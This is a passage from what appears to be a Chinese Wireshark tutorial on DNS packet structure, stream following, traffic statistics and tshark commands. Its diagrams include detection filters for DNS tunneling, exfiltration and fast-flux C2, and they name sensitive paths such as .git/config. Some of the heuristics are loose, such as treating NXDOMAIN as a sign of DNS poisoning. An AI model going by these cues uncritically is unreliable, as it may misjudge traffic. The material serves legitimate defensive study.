font-family="Consolas,Arial">Location: /dashboard/admin</text>  <text x="562" y="496" font-size="10" fill="#7dd3fc" font-family="Consolas,Arial">Content-Length: 0</text>
</svg>
```
```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="1080" height="540" style="max-width:100%;background:linear-gradient(180deg,#020617 0%,#0f172a 100%);border-radius:14px;border:1px solid #1e293b">
  <defs>
    <linearGradient id="g1s14" x1="0" x2="1" y1="0" y2="0"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="g2s14" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#1e293b"/><stop offset="1" stop-color="#020617"/></linearGradient>
    <marker id="arrs14" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#60a5fa"/></marker>
    <filter id="shs14"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="64" fill="url(#g1s14)" opacity="0.3"/>
  <rect x="0" y="0" width="1080" height="2" fill="url(#g1s14)"/>
  <rect x="0" y="60" width="1080" height="2" fill="#1e293b"/>  <text x="540" y="36" text-anchor="middle" font-size="20" font-weight="800" fill="#f1f5f9" font-family="Microsoft YaHei,Arial" filter="url(#shs14)">图 5-14 DNS 报文结构 + 递归查询 vs 迭代查询 两种解析流程对比</text>  <text x="540" y="56" text-anchor="middle" font-size="12" fill="#94a3b8" font-family="Microsoft YaHei,Arial">DNS=53 端口 UDP；查询域名字符串 + TYPE(A/AAAA/CNAME/MX/TXT) → 递归=客户问本地DNS 本地DNS全替你跑；迭代=本地DNS一个个问根/顶级/权威</text>  <rect x="30" y="100" width="460" height="310" rx="12" fill="#0b1530" stroke="#a855f7"/>  <text x="260" y="122" text-anchor="middle" font-size="13" font-weight="800" fill="#c4b5fd" font-family="Microsoft YaHei,Arial">① DNS 报文结构（ID/Flags/Questions/Answers）</text>  <rect x="42" y="132" width="436" height="32" rx="5" fill="#0f172a" stroke="#a855f7"/>  <text x="52" y="145" font-size="9.8" font-weight="800" fill="#a855f7">Transaction ID (2B)</text>  <text x="52" y="158" font-size="9" fill="#cbd5e1" font-family="Consolas">0x1234=匹配查询与响应  成对出现</text>  <rect x="42" y="166" width="436" height="32" rx="5" fill="#0f172a" stroke="#8b5cf6"/>  <text x="52" y="179" font-size="9.8" font-weight="800" fill="#8b5cf6">Flags (2B)</text>  <text x="52" y="192" font-size="9" fill="#cbd5e1" font-family="Consolas">QR=0查询/1响应  Opcode=0标准查询  RCODE=0成功/3 NXDOMAIN</text>  <rect x="42" y="200" width="436" height="32" rx="5" fill="#0f172a" stroke="#ec4899"/>  <text x="52" y="213" font-size="9.8" font-weight="800" fill="#ec4899">Questions (2B)</text>  <text x="52" y="226" font-size="9" fill="#cbd5e1" font-family="Consolas">查询数量=一般=1  （QNAME+QTYPE+QCLASS）</text>  <rect x="42" y="234" width="436" height="32" rx="5" fill="#0f172a" stroke="#ef4444"/>  <text x="52" y="247" font-size="9.8" font-weight="800" fill="#ef4444">Answer RRs (2B)</text>  <text x="52" y="260" font-size="9" fill="#cbd5e1" font-family="Consolas">响应的 A/AAAA/CNAME 记录数量 成功≥1</text>  <rect x="42" y="268" width="436" height="32" rx="5" fill="#0f172a" stroke="#f59e0b"/>  <text x="52" y="281" font-size="9.8" font-weight="800" fill="#f59e0b">Authority RRs (2B)</text>  <text x="52" y="294" font-size="9" fill="#cbd5e1" font-family="Consolas">权威 NS 服务器记录（ns1.dns.com）</text>  <rect x="42" y="302" width="436" height="32" rx="5" fill="#0f172a" stroke="#0ea5e9"/>  <text x="52" y="315" font-size="9.8" font-weight="800" fill="#0ea5e9">Additional RRs (2B)</text>  <text x="52" y="328" font-size="9" fill="#cbd5e1" font-family="Consolas">A 记录把 NS 的 IP 一起给=省一次查询</text>  <rect x="42" y="336" width="436" height="32" rx="5" fill="#0f172a" stroke="#06b6d4"/>  <text x="52" y="349" font-size="9.8" font-weight="800" fill="#06b6d4">Queries 段·QNAME</text>  <text x="52" y="362" font-size="9" fill="#cbd5e1" font-family="Consolas">压缩格式 www.baidu.com → \x03www\x05baidu\x03com\x00</text>  <rect x="42" y="370" width="436" height="32" rx="5" fill="#0f172a" stroke="#10b981"/>  <text x="52" y="383" font-size="9.8" font-weight="800" fill="#10b981">Queries 段·QTYPE</text>  <text x="52" y="396" font-size="9" fill="#cbd5e1" font-family="Consolas">A=1 (IPv4)  AAAA=28  CNAME=5  MX=15  TXT=16  ANY=255</text>  <line x1="520" y1="130" x2="520" y2="350" stroke="#0ea5e9"/>  <line x1="700" y1="130" x2="700" y2="350" stroke="#10b981"/>  <line x1="880" y1="130" x2="880" y2="350" stroke="#8b5cf6"/>  <line x1="1000" y1="130" x2="1000" y2="350" stroke="#f59e0b"/>  <text x="520" y="122" text-anchor="middle" font-size="10" font-weight="800" fill="#0ea5e9">用户</text>  <text x="700" y="122" text-anchor="middle" font-size="10" font-weight="800" fill="#10b981">本地DNS LDNS</text>  <text x="880" y="122" text-anchor="middle" font-size="10" font-weight="800" fill="#8b5cf6">根/顶级域</text>  <text x="1000" y="122" text-anchor="middle" font-size="10" font-weight="800" fill="#f59e0b">权威DNS</text>  <text x="760" y="112" text-anchor="middle" font-size="13" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">② 递归查询 Recursive（RD=1）→ 一次性帮你查完</text>  <line x1="520" y1="155" x2="690" y2="155" stroke="#0ea5e9" stroke-width="2" marker-end="url(#arr)"/>  <text x="605.0" y="151.0" text-anchor="middle" font-size="10" fill="#0ea5e9" font-family="Consolas,Arial">① 查 www.xx.com</text>  <line x1="690" y1="185" x2="530" y2="185" stroke="#10b981" stroke-width="2" marker-end="url(#arr)"/>  <text x="610.0" y="181.0" text-anchor="middle" font-size="10" fill="#10b981" font-family="Consolas,Arial">⑥ 返回结果</text>  <line x1="700" y1="215" x2="870" y2="215" stroke="#8b5cf6" stroke-width="2" marker-end="url(#arr)"/>  <text x="785.0" y="211.0" text-anchor="middle" font-size="10" fill="#8b5cf6" font-family="Consolas,Arial">② 问根/顶级</text>  <line x1="870" y1="245" x2="710" y2="245" stroke="#8b5cf6" stroke-width="2" marker-end="url(#arr)"/>  <text x="790.0" y="241.0" text-anchor="middle" font-size="10" fill="#8b5cf6" font-family="Consolas,Arial">③ 返回 NS=权威</text>  <line x1="700" y1="275" x2="990" y2="275" stroke="#f59e0b" stroke-width="2" marker-end="url(#arr)"/>  <text x="845.0" y="271.0" text-anchor="middle" font-size="10" fill="#f59e0b" font-family="Consolas,Arial">④ 问权威</text>  <line x1="990" y1="315" x2="710" y2="315" stroke="#f59e0b" stroke-width="2" marker-end="url(#arr)"/>  <text x="850.0" y="311.0" text-anchor="middle" font-size="10" fill="#f59e0b" font-family="Consolas,Arial">⑤ A=1.2.3.4</text>  <rect x="500" y="400" width="550" height="120" rx="10" fill="#020617" stroke="#06b6d4"/>  <text x="775" y="420" text-anchor="middle" font-size="12" font-weight="800" fill="#67e8f9" font-family="Microsoft YaHei,Arial">③ DNS 9 条高频显示过滤器 / 常见攻击</text>  <text x="510" y="440.0" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">① dns  →  只看所有 DNS 包 / dns.flags.response == 0 查询 / ==1 响应</text>  <text x="510" y="451.2" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">② dns.qry.name == 'www.baidu.com'  精确指定被查域名</text>  <text x="510" y="462.4" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">③ dns.flags.rcode == 3 → NXDOMAIN 不存在=DNS 投毒常见特征</text>  <text x="510" y="473.6" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">④ dns.qry.type == 16 (TXT 记录) → DNS Tunneling 隧道可疑</text>  <text x="510" y="484.8" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">⑤ dns.qry.name contains '.bit.' / '.onion.' → 暗网/可疑</text>  <text x="510" y="496.0" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">⑥ dns.count.queries &gt; 1000/10s → DNS 放大攻击 DoS</text>  <text x="510" y="507.2" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">⑦ dns.resp.ttl &lt; 60 极短 TTL → Fast-Flux C2 流量</text>  <text x="510" y="518.4" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">⑧ frame contains 'dGhpcyBpcy' → DNS Exfiltration 明文出数据</text>  <text x="510" y="529.6" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">⑨ dns.qry.name matches '^[a-zA-Z0-9]{30,}\.' → 超长子域名=隧道</text>
</svg>
```






### TCP流追踪

TCP是面向连接的协议，一个完整的数据传输需要多次握手和数据交换。

**追踪TCP流：**

1. 右键点击一个TCP数据包
2. 选择"Follow" → "TCP Stream"
3. 新窗口显示完整的TCP会话内容

**TCP流内容：**

窗口显示：
- 红色：客户端发送的数据
- 蓝色：服务器发送的数据
- ASCII：文本内容
- Raw：原始字节

### UDP流追踪

UDP是无连接协议，但仍可以追踪相关数据包。

**追踪UDP流：**
1. 右键点击UDP包
2. 选择"Follow" → "UDP Stream"

### HTTP流追踪

**追踪HTTP流：**
1. 右键点击HTTP包
2. 选择"Follow" → "HTTP Stream"

可以查看完整的HTTP请求和响应。

### SSL/TLS流追踪

HTTPS流量是加密的，但可以追踪加密过程：
1. 右键点击TLS包
2. 选择"Follow" → "TLS Stream"

---

## 5.10 流量统计与分析详解

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="1080" height="540" style="max-width:100%;background:linear-gradient(180deg,#020617 0%,#0f172a 100%);border-radius:14px;border:1px solid #1e293b">
  <defs>
    <linearGradient id="g1s15" x1="0" x2="1" y1="0" y2="0"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="g2s15" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#1e293b"/><stop offset="1" stop-color="#020617"/></linearGradient>
    <marker id="arrs15" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#60a5fa"/></marker>
    <filter id="shs15"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="64" fill="url(#g1s15)" opacity="0.3"/>
  <rect x="0" y="0" width="1080" height="2" fill="url(#g1s15)"/>
  <rect x="0" y="60" width="1080" height="2" fill="#1e293b"/>  <text x="540" y="36" text-anchor="middle" font-size="20" font-weight="800" fill="#f1f5f9" font-family="Microsoft YaHei,Arial" filter="url(#shs15)">图 5-15 Statistics 统计分析 6 大模块：会话矩阵 / IO Graph / 协议分级 / 端点 / HTTP / 专家</text>  <text x="540" y="56" text-anchor="middle" font-size="12" fill="#94a3b8" font-family="Microsoft YaHei,Arial">分析恶意流量第 1 步=先看 Statistics=一眼发现异常 IP/端口/带宽峰值</text>  <rect x="30" y="100" width="335" height="200" rx="14" fill="#0b1530" stroke="#0ea5e9"/>  <rect x="30" y="100" width="335" height="34" rx="14" fill="#0ea5e9" opacity="0.2"/>  <text x="198" y="123" text-anchor="middle" font-size="12" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① Conversations 会话矩阵</text>  <text x="42" y="160" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Statistics→Conversations\n列 4 标签: Ethernet/IPv4/TCP/UDP\n谁和谁聊得最多=排序看 Packets/Bytes\n=找到 C2 目标 99% 用这个</text>  <rect x="40" y="260" width="315" height="28" rx="4" fill="#0f172a" stroke="#0ea5e9" stroke-dasharray="4 3"/>  <text x="198" y="278" text-anchor="middle" font-size="9.2" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">💡 4 个地址对: IP1↔IP2 / Port1↔Port2</text>  <rect x="375" y="100" width="335" height="200" rx="14" fill="#0b1530" stroke="#10b981"/>  <rect x="375" y="100" width="335" height="34" rx="14" fill="#10b981" opacity="0.2"/>  <text x="543" y="123" text-anchor="middle" font-size="12" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">② Endpoints 端点统计</text>  <text x="387" y="160" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">谁发的包最多=源 IP Top 排行\n看 Bytes 最大的那台=挖矿/攻击者=红\nTCP 端口 443 异常多=可疑 C2</text>  <rect x="385" y="260" width="315" height="28" rx="4" fill="#0f172a" stroke="#10b981" stroke-dasharray="4 3"/>  <text x="543" y="278" text-anchor="middle" font-size="9.2" fill="#10b981" font-family="Microsoft YaHei,Arial">💡 排序: Packets↓ Bytes↓ TxBytes↓</text>  <rect x="720" y="100" width="335" height="200" rx="14" fill="#0b1530" stroke="#8b5cf6"/>  <rect x="720" y="100" width="335" height="34" rx="14" fill="#8b5cf6" opacity="0.2"/>  <text x="888" y="123" text-anchor="middle" font-size="12" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">③ Protocol Hierarchy 协议分级统计</text>  <text x="732" y="160" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">各协议占比%: TCP 80% UDP 15%\n突然出现 5% SMB=内网横向\n突然 10% ICMP=Ping 扫描/ICMP隧道</text>  <rect x="730" y="260" width="315" height="28" rx="4" fill="#0f172a" stroke="#8b5cf6" stroke-dasharray="4 3"/>  <text x="888" y="278" text-anchor="middle" font-size="9.2" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">💡 End % =该协议占整个 pcap%</text>  <rect x="30" y="310" width="335" height="200" rx="14" fill="#0b1530" stroke="#f59e0b"/>  <rect x="30" y="310" width="335" height="34" rx="14" fill="#f59e0b" opacity="0.2"/>  <text x="198" y="333" text-anchor="middle" font-size="12" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">④ I/O Graph 带宽/时间折线图</text>  <text x="42" y="370" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">X=时间轴秒  Y=packets/bytes\nY轴单位: Packets Bytes Bits\n图形类型 Line/Bar/Impulse/Fill\nFilter: tcp/udp/http 叠加看</text>  <rect x="40" y="470" width="315" height="28" rx="4" fill="#0f172a" stroke="#f59e0b" stroke-dasharray="4 3"/>  <text x="198" y="488" text-anchor="middle" font-size="9.2" fill="#f59e0b" font-family="Microsoft YaHei,Arial">💡 峰值=攻击瞬间: 峰值 100x 平均=可疑</text>  <rect x="375" y="310" width="335" height="200" rx="14" fill="#0b1530" stroke="#ec4899"/>  <rect x="375" y="310" width="335" height="34" rx="14" fill="#ec4899" opacity="0.2"/>  <text x="543" y="333" text-anchor="middle" font-size="12" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">⑤ HTTP Statistics HTTP 请求/响应</text>  <text x="387" y="370" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Statistics→HTTP→Requests\n按 Host+URI 排序=看 API 调用\n/actuator/env / .git/config=敏感\n200 大量 404=目录爆破</text>  <rect x="385" y="470" width="315" height="28" rx="4" fill="#0f172a" stroke="#ec4899" stroke-dasharray="4 3"/>  <text x="543" y="488" text-anchor="middle" font-size="9.2" fill="#ec4899" font-family="Microsoft YaHei,Arial">💡 Load Distribution 看请求分配</text>  <rect x="720" y="310" width="335" height="200" rx="14" fill="#0b1530" stroke="#ef4444"/>  <rect x="720" y="310" width="335" height="34" rx="14" fill="#ef4444" opacity="0.2"/>  <text x="888" y="333" text-anchor="middle" font-size="12" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">⑥ Expert Info 专家信息告警</text>  <text x="732" y="370" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">分组: Chat Note Warn Error\nTCP 重传/重复ACK/Zero Window\n=网络故障诊断第 1 工具\nHTTP 304 缓存/5xx 错误诊断</text>  <rect x="730" y="470" width="315" height="28" rx="4" fill="#0f172a" stroke="#ef4444" stroke-dasharray="4 3"/>  <text x="888" y="488" text-anchor="middle" font-size="9.2" fill="#ef4444" font-family="Microsoft YaHei,Arial">💡 Warning 黄色/Error 红色=重点看</text>
</svg>
```


### 协议层级统计

**打开统计：**
点击"Statistics" → "Protocol Hierarchy"

显示各协议占比：
```
Frame
├── Ethernet
    ├── Internet Protocol
        ├── Transmission Control Protocol
            ├── Hypertext Transfer Protocol
        ├── User Datagram Protocol
            ├── Domain Name System
        ├── Internet Control Message Protocol
```

### 会话统计

**打开会话统计：**
点击"Statistics" → "Conversations"

显示：
- Ethernet会话（MAC地址）
- IP会话（IP地址）
- TCP会话（IP+端口）
- UDP会话（IP+端口）

### 端点统计

**打开端点统计：**
点击"Statistics" → "Endpoints"

显示各端点的统计信息。

### IO图表

**打开IO图表：**
点击"Statistics" → "IO Graph"

显示流量随时间的变化曲线。

---

## 5.11 tshark 命令行使用详解

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="1080" height="540" style="max-width:100%;background:linear-gradient(180deg,#020617 0%,#0f172a 100%);border-radius:14px;border:1px solid #1e293b">
  <defs>
    <linearGradient id="g1s16" x1="0" x2="1" y1="0" y2="0"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="g2s16" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#1e293b"/><stop offset="1" stop-color="#020617"/></linearGradient>
    <marker id="arrs16" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#60a5fa"/></marker>
    <filter id="shs16"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="64" fill="url(#g1s16)" opacity="0.3"/>
  <rect x="0" y="0" width="1080" height="2" fill="url(#g1s16)"/>
  <rect x="0" y="60" width="1080" height="2" fill="#1e293b"/>  <text x="540" y="36" text-anchor="middle" font-size="20" font-weight="800" fill="#f1f5f9" font-family="Microsoft YaHei,Arial" filter="url(#shs16)">图 5-16 tshark (CLI 版 Wireshark) 12 大高频命令：批量抓包/分析/pcap 离线处理自动化神器</text>  <text x="540" y="56" text-anchor="middle" font-size="12" fill="#94a3b8" font-family="Microsoft YaHei,Arial">tshark=无 GUI 服务器场景必备；dumpcap 纯抓包=性能最佳；editcap 切割/合并/转换 pcap；mergecap 合并多个 pcap → 4 件套=全场景覆盖</text>  <rect x="30" y="100" width="250" height="68" rx="12" fill="#0b1530" stroke="#0ea5e9" filter="url(#sh)"/>  <rect x="30" y="100" width="250" height="30" rx="12" fill="#0ea5e9" opacity="0.18"/>  <rect x="30" y="100" width="250" height="30" rx="12" fill="none" stroke="#0ea5e9"/>  <text x="44" y="120" font-size="12" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① tshark</text>  <text x="44" y="148" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">分析为主：读 pcap + 显示过滤器 + -T fields/-z 统计</text>  <rect x="290" y="100" width="250" height="68" rx="12" fill="#0b1530" stroke="#10b981" filter="url(#sh)"/>  <rect x="290" y="100" width="250" height="30" rx="12" fill="#10b981" opacity="0.18"/>  <rect x="290" y="100" width="250" height="30" rx="12" fill="none" stroke="#10b981"/>  <text x="304" y="120" font-size="12" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">② dumpcap</text>  <text x="304" y="148" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">纯抓包：网卡/BPF 过滤器/多文件切割 ring buffer</text>  <rect x="550" y="100" width="250" height="68" rx="12" fill="#0b1530" stroke="#8b5cf6" filter="url(#sh)"/>  <rect x="550" y="100" width="250" height="30" rx="12" fill="#8b5cf6" opacity="0.18"/>  <rect x="550" y="100" width="250" height="30" rx="12" fill="none" stroke="#8b5cf6"/>  <text x="564" y="120" font-size="12" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">③ editcap</text>  <text x="564" y="148" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">离线文件处理：切割/合并/去重/截短/改时间戳</text>  <rect x="810" y="100" width="250" height="68" rx="12" fill="#0b1530" stroke="#a855f7" filter="url(#sh)"/>  <rect x="810" y="100" width="250" height="30" rx="12" fill="#a855f7" opacity="0.18"/>  <rect x="810" y="100" width="250" height="30" rx="12" fill="none" stroke="#a855f7"/>  <text x="824" y="120" font-size="12" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">④ mergecap</text>  <text x="824" y="148" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">合并 pcap：按时间戳合并 多个 pcap → 一个</text>  <rect x="30" y="180" width="505" height="48" rx="8" fill="#0b1530" stroke="#0ea5e9"/>  <rect x="30" y="180" width="135" height="48" rx="8" fill="#0ea5e9" opacity="0.18"/>  <text x="100" y="203" text-anchor="middle" font-size="10" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">1. 列出网卡</text>  <text x="172" y="203" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Arial">tshark -D</text>  <text x="172" y="218" font-size="8.5" fill="#94a3b8" font-family="Consolas,Arial"></text>  <rect x="545" y="180" width="505" height="48" rx="8" fill="#0b1530" stroke="#10b981"/>  <rect x="545" y="180" width="135" height="48" rx="8" fill="#10b981" opacity="0.18"/>  <text x="615" y="203" text-anchor="middle" font-size="10" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">2. 指定网卡抓 100 包</text>  <text x="687" y="203" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Arial">tshark -i 1 -c 100 -w out.pcap</text>  <text x="687" y="218" font-size="8.5" fill="#94a3b8" font-family="Consolas,Arial"></text>  <rect x="30" y="234" width="505" height="48" rx="8" fill="#0b1530" stroke="#8b5cf6"/>  <rect x="30" y="234" width="135" height="48" rx="8" fill="#8b5cf6" opacity="0.18"/>  <text x="100" y="257" text-anchor="middle" font-size="10" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">3. BPF 抓 HTTP 80</text>  <text x="172" y="257" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Arial">tshark -i eth0 -f 'tcp port 80' -a duration:60</text>  <text x="172" y="272" font-size="8.5" fill="#94a3b8" font-family="Consolas,Arial"></text>  <rect x="545" y="234" width="505" height="48" rx="8" fill="#0b1530" stroke="#ec4899"/>  <rect x="545" y="234" width="135" height="48" rx="8" fill="#ec4899" opacity="0.18"/>  <text x="615" y="257" text-anchor="middle" font-size="10" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">4. 显示过滤器 ip+tls</text>  <text x="687" y="257" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Arial">tshark -r in.pcap -Y 'ip.addr==1.1.1.1 &amp;&amp; tls'</text>  <text x="687" y="272" font-size="8.5" fill="#94a3b8" font-family="Consolas,Arial"></text>  <rect x="30" y="288" width="505" height="48" rx="8" fill="#0b1530" stroke="#ef4444"/>  <rect x="30" y="288" width="135" height="48" rx="8" fill="#ef4444" opacity="0.18"/>  <text x="100" y="311" text-anchor="middle" font-size="10" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">5. 提取字段（CSV）</text>  <text x="172" y="311" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Arial">tshark -r in.pcap -T fields -e frame.time -e ip.src -e htt</text>  <text x="172" y="326" font-size="8.5" fill="#94a3b8" font-family="Consolas,Arial">p.request.uri</text>  <rect x="545" y="288" width="505" height="48" rx="8" fill="#0b1530" stroke="#f59e0b"/>  <rect x="545" y="288" width="135" height="48" rx="8" fill="#f59e0b" opacity="0.18"/>  <text x="615" y="311" text-anchor="middle" font-size="10" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">6. 导 JSON 格式</text>  <text x="687" y="311" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Arial">tshark -r in.pcap -T json -Y http &gt; http.json</text>  <text x="687" y="326" font-size="8.5" fill="#94a3b8" font-family="Consolas,Arial"></text>  <rect x="30" y="342" width="505" height="48" rx="8" fill="#0b1530" stroke="#a855f7"/>  <rect x="30" y="342" width="135" height="48" rx="8" fill="#a855f7" opacity="0.18"/>  <text x="100" y="365" text-anchor="middle" font-size="10" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">7. 统计会话矩阵 Top10</text>  <text x="172" y="365" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Arial">tshark -r in.pcap -z conv,tcp -q | tail -20</text>  <text x="172" y="380" font-size="8.5" fill="#94a3b8" font-family="Consolas,Arial"></text>  <rect x="545" y="342" width="505" height="48" rx="8" fill="#0b1530" stroke="#06b6d4"/>  <rect x="545" y="342" width="135" height="48" rx="8" fill="#06b6d4" opacity="0.18"/>  <text x="615" y="365" text-anchor="middle" font-size="10" font-weight="800" fill="#06b6d4" font-family="Microsoft YaHei,Arial">8. 统计协议分级</text>  <text x="687" y="365" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Arial">tshark -r in.pcap -z io,phs -q | head -40</text>  <text x="687" y="380" font-size="8.5" fill="#94a3b8" font-family="Consolas,Arial"></text>  <rect x="30" y="396" width="505" height="48" rx="8" fill="#0b1530" stroke="#6366f1"/>  <rect x="30" y="396" width="135" height="48" rx="8" fill="#6366f1" opacity="0.18"/>  <text x="100" y="419" text-anchor="middle" font-size="10" font-weight="800" fill="#6366f1" font-family="Microsoft YaHei,Arial">9. 导出 HTTP 对象</text>  <text x="172" y="419" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Arial">tshark -r in.pcap --export-objects http,./out_http/</text>  <text x="172" y="434" font-size="8.5" fill="#94a3b8" font-family="Consolas,Arial"></text>  <rect x="545" y="396" width="505" height="48" rx="8" fill="#0b1530" stroke="#dc2626"/>  <rect x="545" y="396" width="135" height="48" rx="8" fill="#dc2626" opacity="0.18"/>  <text x="615" y="419" text-anchor="middle" font-size="10" font-weight="800" fill="#dc2626" font-family="Microsoft YaHei,Arial">10. 按 60s 切 100MB 环形</text>  <text x="687" y="419" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Arial">dumpcap -i eth0 -b duration:60 -b files:100 -b filesize:10</text>  <text x="687" y="434" font-size="8.5" fill="#94a3b8" font-family="Consolas,Arial">0000 -w ring.pcap</text>  <rect x="30" y="450" width="505" height="48" rx="8" fill="#0b1530" stroke="#0ea5e9"/>  <rect x="30" y="450" width="135" height="48" rx="8" fill="#0ea5e9" opacity="0.18"/>  <text x="100" y="473" text-anchor="middle" font-size="10" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">11. editcap 切 1000 包一个</text>  <text x="172" y="473" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Arial">editcap -c 1000 big.pcap part/slice_</text>  <text x="172" y="488" font-size="8.5" fill="#94a3b8" font-family="Consolas,Arial"></text>  <rect x="545" y="450" width="505" height="48" rx="8" fill="#0b1530" stroke="#10b981"/>  <rect x="545" y="450" width="135" height="48" rx="8" fill="#10b981" opacity="0.18"/>  <text x="615" y="473" text-anchor="middle" font-size="10" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">12. 合并按时间戳</text>  <text x="687" y="473" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Arial">mergecap -w merged.pcap a.pcap b.pcap c.pcap</text>  <text x="687" y="488" font-size="8.5" fill="#94a3b8" font-family="Consolas,Arial"></text>  <rect x="30" y="510" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="526" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">4 件套分工：dumpcap 抓（最稳）→ editcap/mergecap 整理 → tshark 分析+提取=批量分析 10GB pcap=纯命令行无 GUI 也能干活</text>
</svg>
```


### 什么是tshark？

tshark是Wireshark的命令行版本，适合：
- 自动化脚本
- 远程服务器分析
- 批量处理

### 基本使用

**捕获数据包：**
```bash
tshark -i eth0
```

**捕获并保存：**
```bash
tshark -i eth0 -w output.pcap
```

**读取文件：**
```bash
tshark -r input.pcap
```

**使用过滤器：**
```bash
tshark -r input.pcap -Y "http"
```

**显示特定字段：**
```bash
tshark -r input.pcap -T fields -e ip.src -e ip.dst -e tcp.port
```

---

## 5.12 实战案例：HTTP流量分析

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 560" width="1080" height="560" style="max-width:100%;background:linear-gradient(180deg,#020617 0%,#0f172a 100%);border-radius:14px;border:1px solid #1e293b">
  <defs>
    <linearGradient id="g1s17" x1="0" x2="1" y1="0" y2="0"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="g2s17" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#1e293b"/><stop offset="1" stop-color="#020617"/></linearGradient>
    <marker id="arrs17" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#60a5fa"/></marker>
    <filter id="shs17"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/></filter>
  </defs>
